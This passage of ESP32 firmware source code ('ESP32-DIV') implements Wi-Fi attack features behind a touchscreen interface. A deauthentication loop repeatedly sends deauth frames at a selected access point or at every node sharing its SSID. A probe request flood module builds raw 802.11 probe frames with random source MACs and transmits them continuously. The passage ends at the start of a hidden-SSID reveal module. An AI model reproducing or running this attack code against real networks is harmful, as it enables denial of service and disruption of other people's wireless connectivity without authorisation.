    if (isButtonPressedEdge(BTN_SELECT)) {
      attack_running = !attack_running;
      if (attack_running) {
        deautherEnsureApOnChannel(selectedChannel);
      } else {
        last_packet_time = 0;
      }
      drawAttackScreen();
      deautherLastButtonPress = now;
      return;
    }
    if (isButtonPressedEdge(BTN_RIGHT)) {
      if (groupTargetCount > 1) {
        attackGroup = !attackGroup;
        groupTargetIndex = 0;
        drawAttackScreen();
        deautherLastButtonPress = now;
      }
      return;
    }
    if (groupTargetCount > 1 && !attackGroup) {
      if (isButtonPressedEdge(BTN_UP)) {
        deautherMoveNodeSelection(-1);
        drawAttackScreen();
        deautherLastButtonPress = now;
        return;
      }
      if (isButtonPressedEdge(BTN_DOWN)) {
        deautherMoveNodeSelection(1);
        drawAttackScreen();
        deautherLastButtonPress = now;
        return;
      }
    }
    return;
  }

  if (scanning) {
    return;
  }

  // Lista de scan: LEFT sai, UP/DOWN movem, RIGHT rescaneia, SELECT abre.
  if (isButtonPressedEdge(BTN_LEFT)) {
    feature_exit_requested = true;
    deautherLastButtonPress = now;
    return;
  }
  if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
    currentIndex--;
    drawScanScreen();
    deautherLastButtonPress = now;
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN) && currentIndex < dedupCount - 1) {
    currentIndex++;
    drawScanScreen();
    deautherLastButtonPress = now;
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    if (scanNetworks()) {
      drawScanScreen();
    }
    deautherLastButtonPress = now;
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT) && dedupCount > 0) {
    deautherOpenTarget(currentIndex);
    deautherLastButtonPress = now;
  }
}

void handleTouch() {
  int x, y;
  if (!readTouchXY(x, y)) return;

  static unsigned long lastTouchActionMs = 0;
  const unsigned long now = millis();
  if (now - lastTouchActionMs < 300) {
    return;
  }

  bool redraw = false;
  if (selected_ap_index == -1) {
    const int listMaxY = LIST_FIRST_ROW_Y + (deautherNetworksPerPage() * LIST_ROW_H);
    if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && dedupCount > 0) {
      int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * deautherNetworksPerPage());
      if (index >= 0 && index < dedupCount) {
        deautherOpenTarget(index);
        lastTouchActionMs = now;
      }
    } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        drawButton(0, 304, 57, 16, "Rescan", true, false);
        if (scanNetworks()) {
          drawScanScreen();
        }
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 122 && x <= 179 && currentIndex > 0) {
        drawButton(117, 304, 57, 16, "Prev", true, false);
        currentIndex--;
        drawScanScreen();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240 && currentIndex < dedupCount - 1) {
        drawButton(178, 304, 57, 16, "Next", true, false);
        currentIndex++;
        drawScanScreen();
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  } else {
    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
      if (x >= 0 && x <= 57) {
        drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
        attack_running = !attack_running;
        if (attack_running) {
          deautherEnsureApOnChannel(selectedChannel);
        } else {
          last_packet_time = 0;
        }
        drawAttackScreen();
        lastTouchActionMs = now;
        redraw = true;
      } else if (x >= 183 && x <= 240) {
        drawButton(177, 304, 57, 16, "Back", true, false);
        attack_running = false;
        last_packet_time = 0;
        selected_ap_index = -1;
        drawScanScreen();
        lastTouchActionMs = now;
        redraw = true;
      }
    }
  }

  if (redraw) {
    delay(50);
  }
}

static bool uiDrawn = false;

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
          }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              if (i == 1) {
                feature_exit_requested = true;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void deauther2Setup() {
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  deautherUpdateNavLabels(false);
  featureClearContent(TFT_BLACK);

  setupTouchscreen();
  uiDrawn = false;

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();
  runUI();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  tft.setTextColor(GREEN, BLACK);
  tft.setTextSize(1);
  tft.setCursor(10, 50);
  tft.println("Initializing...");

  attack_running     = false;
  selected_ap_index  = -1;
  current_page       = 0;
  currentIndex       = 0;
  scanning           = false;
  groupTargetCount   = 0;
  groupTargetIndex   = 0;
  attackGroup        = false;
  groupSelectedIndex = 0;
  nodeScrollOffset   = 0;

  if (!WifiScan::loadApListFromWifiCache(&ap_list, &network_count, compare_ap)) {
    scanNetworks();
  }
  buildDedupView();

  drawScanScreen();
  drawScanScreen();
  redrawTouchButtonBar();
}

void deauther2Loop() {
  tft.drawFastHLine(0, 19, 240, UI_LINE);

  deautherHandleNavButtons();
  handleTouch();
  updateStatusBar();
  runUI();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  uint32_t current_time = millis();
  if (attack_running && selected_ap_index != -1) {
    uint32_t heap = ESP.getFreeHeap();
    if (heap < 30000) {
      attack_running = false;
      last_packet_time = 0;
      drawAttackScreen();
      delay(3000);
      return;
    }

    if (consecutive_failures > 10) {
      resetWifi();
      last_packet_time = 0;
      delay(3000);
      return;
    }

    if (current_time - last_packet_time >= 100 && attack_running) {
      if (attackGroup && groupTargetCount > 1) {
        // Round-robin across every node that shares the SSID.
        groupTargetIndex = (groupTargetIndex + 1) % groupTargetCount;
        wsl_bypasser_send_deauth_frame(&groupTargets[groupTargetIndex],
                                       groupTargets[groupTargetIndex].primary);
      } else {
        wsl_bypasser_send_deauth_frame(&selectedAp, selectedChannel);
      }
      last_packet_time = current_time;
    }
  }

  static uint32_t last_channel_check = 0;
  if (attack_running && current_time - last_channel_check > 15000) {
    uint8_t new_channel;
    if (checkApChannel(selectedAp.bssid, &new_channel)) {
      if (new_channel != selectedChannel) {
        selectedChannel = new_channel;
        wifi_config_t ap_config = {0};
        strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
        ap_config.ap.ssid_len = strlen("ESP32-DIV");
        ap_config.ap.password[0] = '\0';
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        ap_config.ap.ssid_hidden = 1;
        ap_config.ap.max_connection = 4;
        ap_config.ap.beacon_interval = 100;
        ap_config.ap.channel = selectedChannel;
        ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
      }
    }
    last_channel_check = current_time;
  }

  static uint32_t last_status_time = 0;
  if (attack_running && current_time - last_status_time > 2000) {
    drawAttackScreen();
    last_status_time = current_time;
  }
}

}  // namespace Deauther2

namespace ProbeRequestFlood {

#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320

// Larger row height = easier touch selection.
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;

static unsigned long probeLastButtonPress = 0;
static const unsigned long probeDebounceTime = 200;

static int probeNetworksPerPage() {
  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
}

static void probeUpdateNavLabels(bool onAttackScreen);
void drawScanScreen();
void drawAttackScreen();

static uint8_t probe_frame[128];
static const uint8_t probe_rates[8] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};

uint32_t packet_count = 0;
uint32_t success_count = 0;
uint32_t consecutive_failures = 0;
bool attack_running = false;
wifi_ap_record_t selectedAp;
uint8_t selectedChannel;
int selected_ap_index = -1;
int network_count = 0;
wifi_ap_record_t *ap_list = nullptr;
bool scanning = false;
uint32_t last_packet_time = 0;
int current_page = 0;
int currentIndex = 0;

static void probeUpdateNavLabels(bool onAttackScreen) {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Layout remapeado:
  //  lista de scan: LEFT=Exit, DOWN=Next, SELECT=View, UP=Prev, RIGHT=Rescan.
  //  tela de ataque (View): LEFT=Back (pra lista), SELECT=Start/Stop, resto livre.
  if (onAttackScreen) {
    setTouchNavLabels("Back", nullptr, attack_running ? "Stop" : "Start", nullptr, nullptr);
  } else {
    setTouchNavLabels("Exit", "Next", "View", "Prev", "Rescan");
  }
  redrawTouchButtonBar();
}

static void probeDrawApRow(int i, int y, bool isSel) {
  char buf[64];
  char ssid[16];
  strncpy(ssid, (char*)ap_list[i].ssid, 11);
  ssid[11] = '\0';
  if (strlen((char*)ap_list[i].ssid) > 11) {
    strcat(ssid, "...");
  }
  const char* enc = ap_list[i].authmode == WIFI_AUTH_OPEN ? "OPEN" : "WPA2";
  snprintf(buf, sizeof(buf), "%02d: %-15s %3d dBm Ch%2d %s",
           i + 1, ssid, ap_list[i].rssi, ap_list[i].primary, enc);

  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
  tft.setCursor(2, y);
  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
  tft.print(isSel ? ">" : " ");
  tft.setCursor(10, y);
  tft.setTextColor(isSel ? ORANGE : (ap_list[i].authmode == WIFI_AUTH_OPEN ? ORANGE : WHITE));
  tft.println(buf);
}

static void probeOpenTarget(int index) {
  if (index < 0 || index >= network_count) {
    return;
  }
  currentIndex = index;
  selected_ap_index = index;
  selectedAp = ap_list[index];
  selectedChannel = ap_list[index].primary;
  drawAttackScreen();
}

static bool uiDrawn = false;

static uint8_t ssidLength(const wifi_ap_record_t *ap) {
    uint8_t len = 0;
    while (len < sizeof(ap->ssid) && ap->ssid[len] != '\0') {
        len++;
    }
    return len;
}

static void makeRandomMac(uint8_t *mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = (uint8_t)random(256);
    }
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static uint16_t buildProbeFrame(const wifi_ap_record_t *ap, uint8_t channel, const uint8_t *srcMac) {
    uint16_t pos = 0;

    probe_frame[pos++] = 0x40;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;

    memset(&probe_frame[pos], 0xFF, 6);
    pos += 6;
    memcpy(&probe_frame[pos], srcMac, 6);
    pos += 6;
    memset(&probe_frame[pos], 0xFF, 6);
    pos += 6;
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = 0x00;

    uint8_t ssid_len = ssidLength(ap);
    probe_frame[pos++] = 0x00;
    probe_frame[pos++] = ssid_len;
    if (ssid_len > 0) {
        memcpy(&probe_frame[pos], ap->ssid, ssid_len);
        pos += ssid_len;
    }

    probe_frame[pos++] = 0x01;
    probe_frame[pos++] = sizeof(probe_rates);
    memcpy(&probe_frame[pos], probe_rates, sizeof(probe_rates));
    pos += sizeof(probe_rates);

    probe_frame[pos++] = 0x03;
    probe_frame[pos++] = 0x01;
    probe_frame[pos++] = channel;

    return pos;
}

static void sendProbeFrame() {
    uint8_t srcMac[6];
    makeRandomMac(srcMac);

    esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
    uint16_t frame_len = buildProbeFrame(&selectedAp, selectedChannel, srcMac);

    esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, probe_frame, frame_len, false);
    packet_count++;
    if (res == ESP_OK) {
        success_count++;
        consecutive_failures = 0;
    } else {
        consecutive_failures++;
    }
}

int compare_ap(const void *a, const void *b) {
    wifi_ap_record_t *ap1 = (wifi_ap_record_t *)a;
    wifi_ap_record_t *ap2 = (wifi_ap_record_t *)b;
    return ap2->rssi - ap1->rssi;
}

void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {

    FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                             : FeatureUI::ButtonStyle::Secondary;
    FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton, bool prevDisabled, const char* nextButton, bool nextDisabled) {
    if (featureHasTouchNavBar()) {
        probeUpdateNavLabels(selected_ap_index >= 0);
        return;
    }

    tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);

    if (leftButton && leftButton[0]) {
        drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
    }

    if (prevButton && prevButton[0]) {
        drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
    }
    if (nextButton && nextButton[0]) {
        drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
    }
}

void drawScanScreen() {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    wifiClearBody(TFT_BLACK);
    tft.setTextSize(1);

    if (scanning) {
        tft.setCursor(10, 50);
        tft.setTextColor(GREEN);
        tft.println("Scanning.");
        loading(100, ORANGE, 0, 0, 3, true);
        tft.setCursor(10, 65);
        tft.println("Wait a moment.");
        return;
    }

    if (network_count == 0) {
        tft.setTextColor(GREEN);
        tft.setCursor(10, 50);
        tft.println("No networks found.");
        tft.setCursor(10, 65);
        tft.println("Press Rescan.");
    } else {
        const int perPage = probeNetworksPerPage();
        if (currentIndex < 0) {
          currentIndex = 0;
        }
        if (currentIndex >= network_count) {
          currentIndex = max(0, network_count - 1);
        }
        current_page = currentIndex / max(1, perPage);

        tft.setTextColor(GREEN);
        tft.setCursor(10, LIST_HEADER_Y);
        tft.println("Networks:");

        char page_buf[20];
        snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
                 current_page + 1, max(1, (network_count + perPage - 1) / perPage));
        tft.setCursor(180, LIST_HEADER_Y);
        tft.setTextColor(GREEN);
        tft.println(page_buf);

        int y = LIST_FIRST_ROW_Y;
        const int start_index = current_page * perPage;
        const int end_index = min(start_index + perPage, network_count);
        for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
          probeDrawApRow(i, y, i == currentIndex);
          y += LIST_ROW_H;
        }
    }

    drawTabBar("Rescan", false, "Prev", currentIndex <= 0, "Next",
               currentIndex >= network_count - 1);
}

bool scanNetworks() {
    scanning = true;
    current_page = 0;
    currentIndex = 0;
    drawScanScreen();

    network_count = WifiScan::staWifiScanSync();
    if (network_count <= 0) {
        scanning = false;
        return false;
    }

    if (ap_list) free(ap_list);
    ap_list = (wifi_ap_record_t *)malloc(network_count * sizeof(wifi_ap_record_t));
    if (!ap_list) {
        scanning = false;
        return false;
    }

    for (int i = 0; i < network_count; i++) {
        wifi_ap_record_t ap_record = {0};
        memcpy(ap_record.bssid, WiFi.BSSID(i), 6);
        strncpy((char*)ap_record.ssid, WiFi.SSID(i).c_str(), sizeof(ap_record.ssid));
        ap_record.rssi = WiFi.RSSI(i);
        ap_record.primary = WiFi.channel(i);
        ap_record.authmode = WiFi.encryptionType(i);
        ap_list[i] = ap_record;
    }

    qsort(ap_list, network_count, sizeof(wifi_ap_record_t), compare_ap);

    scanning = false;
    return true;
}

bool checkApChannel(const uint8_t *bssid, uint8_t *channel) {
    const int n = WifiScan::staWifiScanSync();
    for (int i = 0; i < n; i++) {
        if (memcmp(WiFi.BSSID(i), bssid, 6) == 0) {
            *channel = WiFi.channel(i);
            WiFi.mode(WIFI_AP);
            delay(100);
            return true;
        }
    }

    WiFi.mode(WIFI_AP);
    delay(100);
    return false;
}

void resetWifi() {
    esp_wifi_stop();
    delay(200);
    esp_wifi_start();
    delay(200);
    packet_count = 0;
    success_count = 0;
    consecutive_failures = 0;
}

void drawAttackScreen() {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    wifiClearBody(TFT_BLACK);
    tft.setTextSize(1);

    char buf[64];
    tft.setTextColor(WHITE);
    snprintf(buf, sizeof(buf), "Target: %s", selectedAp.ssid);
    tft.setCursor(10, 50);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
             selectedAp.bssid[0], selectedAp.bssid[1], selectedAp.bssid[2],
             selectedAp.bssid[3], selectedAp.bssid[4], selectedAp.bssid[5]);
    tft.setCursor(10, 70);
    tft.println(buf);

    const char* auth;
    switch (selectedAp.authmode) {
        case WIFI_AUTH_OPEN: auth = "OPEN"; break;
        case WIFI_AUTH_WPA_PSK: auth = "WPA-PSK"; break;
        case WIFI_AUTH_WPA2_PSK: auth = "WPA2-PSK"; break;
        case WIFI_AUTH_WPA_WPA2_PSK: auth = "WPA/WPA2-PSK"; break;
        default: auth = "Unknown"; break;
    }
    snprintf(buf, sizeof(buf), "Auth: %s", auth);
    tft.setCursor(10, 85);
    tft.println(buf);

    tft.setCursor(10, 100);
    tft.setTextColor(attack_running ? ORANGE : UI_DIM_TEXT);
    tft.println(attack_running ? "Status: Running" : "Status: Stopped");

    snprintf(buf, sizeof(buf), "Packets: %u", packet_count);
    tft.setCursor(10, 115);
    tft.setTextColor(WHITE);
    tft.println(buf);

    float success_rate = (packet_count > 0) ? (float)success_count / packet_count * 100 : 0;
    snprintf(buf, sizeof(buf), "Success: %.2f%%", success_rate);
    tft.setCursor(10, 130);
    tft.println(buf);

    snprintf(buf, sizeof(buf), "Heap: %u", ESP.getFreeHeap());
    tft.setCursor(10, 145);
    tft.println(buf);

    const char* buttons[] = {attack_running ? "Stop" : "Start", "Back"};
    drawTabBar(buttons[0], false, "", true, buttons[1], false);
}

static void probeHandleNavButtons() {
    const unsigned long now = millis();
    if (now - probeLastButtonPress < probeDebounceTime) {
        // Keep edge state in sync while debounce is active so a held press
        // cannot fire again as soon as the window expires.
        (void)isButtonPressedEdge(BTN_LEFT);
        (void)isButtonPressedEdge(BTN_RIGHT);
        (void)isButtonPressedEdge(BTN_UP);
        (void)isButtonPressedEdge(BTN_DOWN);
        (void)isButtonPressedEdge(BTN_SELECT);
        return;
    }

    // Layout remapeado: tela de ataque (View) -- LEFT volta pra lista de scan
    // (antes era o RIGHT); SELECT inicia/para o ataque (antes era o LEFT).
    // UP/DOWN/RIGHT ficaram sem funcao aqui.
    if (selected_ap_index >= 0) {
        if (isButtonPressedEdge(BTN_LEFT)) {
            attack_running = false;
            last_packet_time = 0;
            selected_ap_index = -1;
            drawScanScreen();
            probeLastButtonPress = now;
            return;
        }
        if (isButtonPressedEdge(BTN_SELECT)) {
            attack_running = !attack_running;
            if (!attack_running) {
                last_packet_time = 0;
            }
            drawAttackScreen();
            probeLastButtonPress = now;
            return;
        }
        return;
    }

    if (scanning) {
        return;
    }

    // Layout remapeado: lista de scan -- LEFT sai do Probe Request Flood
    // (antes era o SELECT, agora global); RIGHT rescaneia (antes era o
    // LEFT); SELECT abre o alvo selecionado / View (antes era o RIGHT).
    // UP/DOWN continuam Prev/Next, sem mudanca.
    if (isButtonPressedEdge(BTN_LEFT)) {
        feature_exit_requested = true;
        probeLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_UP) && currentIndex > 0) {
        currentIndex--;
        drawScanScreen();
        probeLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_DOWN) && currentIndex < network_count - 1) {
        currentIndex++;
        drawScanScreen();
        probeLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_RIGHT)) {
        if (scanNetworks()) {
            drawScanScreen();
        }
        probeLastButtonPress = now;
        return;
    }
    if (isButtonPressedEdge(BTN_SELECT) && network_count > 0) {
        probeOpenTarget(currentIndex);
        probeLastButtonPress = now;
    }
}


void handleTouch() {
    int x, y;
    if (!readTouchXY(x, y)) return;

    static unsigned long lastTouchActionMs = 0;
    const unsigned long now = millis();
    if (now - lastTouchActionMs < 300) {
        return;
    }

    bool redraw = false;
    if (selected_ap_index == -1) {
        const int listMaxY = LIST_FIRST_ROW_Y + (probeNetworksPerPage() * LIST_ROW_H);
        if (!scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && network_count > 0) {
            int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (current_page * probeNetworksPerPage());
            if (index >= 0 && index < network_count) {
                probeOpenTarget(index);
                lastTouchActionMs = now;
            }
        } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, "Rescan", true, false);
                if (scanNetworks()) {
                    drawScanScreen();
                }
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                drawButton(117, 304, 57, 16, "Prev", true, false);
                currentIndex--;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                drawButton(178, 304, 57, 16, "Next", true, false);
                currentIndex++;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            }
        }
    } else {
        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
            if (x >= 0 && x <= 57) {
                drawButton(0, 304, 57, 16, attack_running ? "Stop" : "Start", true, false);
                attack_running = !attack_running;
                if (!attack_running) {
                    last_packet_time = 0;
                }
                drawAttackScreen();
                lastTouchActionMs = now;
                redraw = true;
            } else if (x >= 183 && x <= 240) {
                drawButton(177, 304, 57, 16, "Back", true, false);
                attack_running = false;
                last_packet_time = 0;
                selected_ap_index = -1;
                drawScanScreen();
                lastTouchActionMs = now;
                redraw = true;
            }
        }
    }

    if (redraw) {
        delay(50);
    }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

  static int iconX[ICON_NUM] = {220, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);
    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;
  static unsigned long lastSpamTime = 0;

  switch (animationState) {
    case 0:
      break;

    case 1:
      if (millis() - lastAnimationTime >= 150) {
        tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
        animationState = 2;
        lastAnimationTime = millis();
      }
      break;

    case 2:
      if (millis() - lastAnimationTime >= 200) {
        animationState = 3;
        lastAnimationTime = millis();
      }
      break;

    case 3:
      switch (activeIcon) {
        case 0:
          scanNetworks();
          delay(50);
          if (scanNetworks()) {
            drawScanScreen();
           }
          animationState = 0;
          activeIcon = -1;
          break;
      }
      break;
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 1) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void probeRequestFloodSetup() {
    pauseBackgroundRadioTasks();
    setTouchButtonInputEnabled(true);
    probeUpdateNavLabels(false);
    featureClearContent(TFT_BLACK);

    setupTouchscreen();
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, true);
    redrawTouchButtonBar();
    runUI();

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    tft.setTextColor(GREEN, BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, 50);
    tft.println("Initializing...");

    attack_running     = false;
    selected_ap_index  = -1;
    current_page       = 0;
    currentIndex       = 0;
    scanning           = false;

    if (!WifiScan::loadApListFromWifiCache(&ap_list, &network_count, compare_ap)) {
        scanNetworks();
    }

    drawScanScreen();

    drawScanScreen();
    redrawTouchButtonBar();
}

void probeRequestFloodLoop() {

    // Layout remapeado: a saida agora e tratada dentro de
    // probeHandleNavButtons() -- LEFT na lista de scan sai do Probe Request
    // Flood; LEFT na tela de ataque (View) so volta pra lista (nao sai do
    // feature). SELECT deixou de ser exit global (agora e "View"/start-stop).

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    probeHandleNavButtons();
    handleTouch();
    updateStatusBar();
    runUI();

    tft.drawFastHLine(0, 19, 240, UI_LINE);

    uint32_t current_time = millis();
    if (attack_running && selected_ap_index != -1) {
        uint32_t heap = ESP.getFreeHeap();
        if (heap < 80000) {
            attack_running = false;
            last_packet_time = 0;
            drawAttackScreen();
            delay(3000);
            return;
        }

        if (consecutive_failures > 10) {
            resetWifi();
            last_packet_time = 0;
            delay(3000);
            return;
        }

        if (current_time - last_packet_time >= 60 && attack_running) {
            sendProbeFrame();
            last_packet_time = current_time;
        }
    }

    static uint32_t last_channel_check = 0;
    if (attack_running && current_time - last_channel_check > 15000) {
        uint8_t new_channel;
        if (checkApChannel(selectedAp.bssid, &new_channel)) {
            if (new_channel != selectedChannel) {
                selectedChannel = new_channel;
                wifi_config_t ap_config = {0};
                strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
                ap_config.ap.ssid_len = strlen("ESP32-DIV");
                /* Hidden and open, matching startListening() below. This
                 * interface exists to push raw frames through WIFI_IF_AP and
                 * nothing is meant to associate with it, so it does not need
                 * a passphrase and should not be advertising one. It had a
                 * fixed key in the source, which made every AP this brought
                 * up a visible WPA2 network with a published password. */
                ap_config.ap.password[0] = '\0';
                ap_config.ap.authmode = WIFI_AUTH_OPEN;
                ap_config.ap.ssid_hidden = 1;
                ap_config.ap.max_connection = 4;
                ap_config.ap.beacon_interval = 100;
                ap_config.ap.channel = selectedChannel;
                ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));

            }
        }
        last_channel_check = current_time;
    }

    static uint32_t last_status_time = 0;
    if (attack_running && current_time - last_status_time > 2000) {
        drawAttackScreen();
        last_status_time = current_time;
      }
  }
}

namespace HiddenSsidReveal {

#define SCREEN_WIDTH 240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 2

static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static constexpr int MAX_HIDDEN_APS = 40;
static constexpr unsigned long LISTEN_HOP_MS = 1500;
static constexpr unsigned long BTN_DEBOUNCE_MS = 200;

struct HiddenAp {
  uint8_t bssid[6];
  int8_t rssi;
  uint8_t channel;
  wifi_auth_mode_t authmode;
  char revealed[33];
  bool has_name;
};

static HiddenAp s_aps[MAX_HIDDEN_APS];
static int s_count = 0;
static int s_currentIndex = 0;
static int s_currentPage = 0;
static int s_selectedIndex = -1;
static bool s_scanning = false;
static bool s_listening = false;
static bool s_forcing = false;
static bool s_uiDrawn = false;
static unsigned long s_lastBtnMs = 0;
